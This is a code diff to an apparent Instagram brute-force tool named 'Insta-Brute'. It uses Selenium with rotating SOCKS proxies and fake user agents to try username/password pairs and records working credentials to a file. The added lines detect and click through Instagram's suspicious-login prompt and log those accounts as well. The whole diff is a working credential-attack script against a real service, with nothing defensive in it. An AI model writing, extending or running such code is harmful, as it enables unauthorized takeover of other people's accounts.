@@ -10,15 +10,15 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from fake_useragent import UserAgent
 
-import pyfiglet as pyg 
+import pyfiglet as pyg
 
-res= pyg.figlet_format("Welcome to Insta-Brute!")   
-print('If you need any extra options, go to my github https://github.com/rmau2016')  
-print(res)  
+res = pyg.figlet_format("Welcome to Insta-Brute!")
+print('If you need any extra options, go to my github https://github.com/rmau2016')
+print(res)
 socks = []
 w_file = open("Success.txt", 'a')
 
-socks_4f = input("What is the Socks 5 file?(N: FOR NO SOCKS)")
+socks_4f = input("What is the Socks file?(N: FOR NO SOCKS)")
 if socks_4f != 'N':
     socks_4f = open(socks_4f, 'r')
 
@@ -53,9 +53,16 @@ class InstaBot:
             time.sleep(getRandomTime())
 
             try:
+                try:
+            	    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
+            	    print("SUSPICIOUS LOGIN ATTEMPT:" +
+            	          username + ":" + password + "\n")
+            	    w_file.write("SUS-LOGIN: "+username + ":" + password+ "\n")
+                except Exception:
+                    print("\nNo suspicious login attempt")
                 function_success(driver, username, password, w_file)
             except Exception:
-                print("Unsuccessful login")
+               print("Unsuccessful login")
 
         if socks_4f == 'N':
             driver = webdriver.Chrome(
@@ -71,9 +78,16 @@ class InstaBot:
             time.sleep(getRandomTime())
 
             try:
+                try:
+            	    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
+            	    print("SUSPICIOUS LOGIN ATTEMPT:" +
+            	          username + ":" + password + "\n")
+            	    w_file.write("SUS-LOGIN: "+username + ":" + password+ "\n")
+                except Exception:
+                    print("\nNo suspicious login attempt")
                 function_success(driver, username, password, w_file)
             except Exception:
-                print("Unsuccessful login")
+               print("Unsuccessful login")
 
 
 def function_success(driver, username, password, w_file):
